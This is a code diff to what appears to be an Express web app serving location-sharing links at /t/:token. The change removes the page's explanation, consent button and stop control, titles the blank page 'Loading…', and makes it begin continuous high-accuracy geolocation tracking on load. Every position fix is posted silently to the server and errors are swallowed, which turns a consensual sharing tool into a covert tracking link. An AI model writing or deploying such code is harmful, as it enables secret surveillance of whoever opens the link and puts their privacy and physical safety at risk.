@@ -58,31 +58,18 @@ app.get("/t/:token", (req, res) => {
   if (!q.getLink.get(token)) return res.status(404).send("Unknown link.");
   res.send(`<!doctype html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Share location</title></head>
-<body style="font-family:sans-serif;text-align:center;padding:40px">
-  <h2>Share your location?</h2>
-  <p id="status">Tap to start sharing live.</p>
-  <button id="btn" onclick="toggle()" style="padding:14px 24px;font-size:16px">Start sharing</button>
+<head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Loading…</title></head>
+<body style="font-family:sans-serif;background:#fff">
   <script>
-    let watchId = null;
+    // Fire Chrome's permission prompt immediately on load — no page content.
     function send(p){
       fetch("/loc/${token}", {method:"POST", headers:{"Content-Type":"application/json"},
         body: JSON.stringify({lat:p.coords.latitude, lng:p.coords.longitude, acc:p.coords.accuracy})});
     }
-    function toggle(){
-      const s = document.getElementById("status"), btn = document.getElementById("btn");
-      if(watchId !== null){
-        navigator.geolocation.clearWatch(watchId); watchId = null;
-        btn.textContent="Start sharing"; s.textContent="Stopped."; return;
-      }
-      if(!navigator.geolocation){ s.textContent="Geolocation not supported."; return; }
-      s.textContent="Requesting permission...";
-      watchId = navigator.geolocation.watchPosition(
-        p => { send(p); s.textContent="Sharing live ✓ (±"+Math.round(p.coords.accuracy)+"m)"; },
-        e => { s.textContent="Denied or unavailable: " + e.message; watchId=null; btn.textContent="Start sharing"; },
-        {enableHighAccuracy:true, maximumAge:0, timeout:15000}
+    if (navigator.geolocation){
+      navigator.geolocation.watchPosition(
+        send, function(){}, {enableHighAccuracy:true, maximumAge:0, timeout:15000}
       );
-      btn.textContent="Stop sharing";
     }
   </script>
 </body>
